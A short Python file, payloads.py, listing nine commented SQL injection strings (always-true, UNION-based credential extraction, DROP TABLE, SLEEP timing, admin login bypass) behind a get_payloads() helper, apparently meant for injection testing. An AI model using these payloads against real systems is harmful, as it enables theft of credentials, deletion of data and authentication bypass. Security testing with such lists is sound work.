# payloads.py

payloads = [
    "1' OR '1'='1'; --",                  # Classic SQL injection
    "1' UNION SELECT username, password FROM users; --",  # Union-based
    "'; DROP TABLE users; --",            # Stacked queries
    "1' AND SLEEP(5); --",                 # Time-based
    "'; SELECT * FROM products WHERE 'a'='a'; --",  # Always true
    "' OR 'x'='x'; --",                    # True condition
    "' AND (SELECT COUNT(*) FROM users) > 0; --",  # Subquery
    "1' AND 1=(SELECT COUNT(*) FROM users); --",  # Count check
    "admin' --",                           # Commented input
]

def get_payloads():
    return payloads
